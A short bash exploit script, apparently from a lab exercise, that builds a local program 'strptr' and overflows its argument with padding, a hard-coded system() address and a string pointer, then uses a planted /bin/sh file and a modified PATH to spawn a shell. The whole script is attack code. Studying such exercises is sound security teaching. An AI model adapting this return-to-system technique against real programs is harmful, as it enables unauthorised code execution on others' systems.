#!/bin/bash

# Address of the string used for overwriting found with gdb
straddr=0x0804a008
systemaddr=0x080490a0

# Make sure the executable is built
make strptr

# Set up the shell script to call
echo /bin/sh > THIS
chmod 777 THIS
export PATH=.:$PATH

# Execute the actual exploit
./strptr "$(python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 256 + pack('<L', $(echo $systemaddr)) + b'A' * 4 + pack('<L', $(echo $straddr)))")"

# Clean up
rm THIS
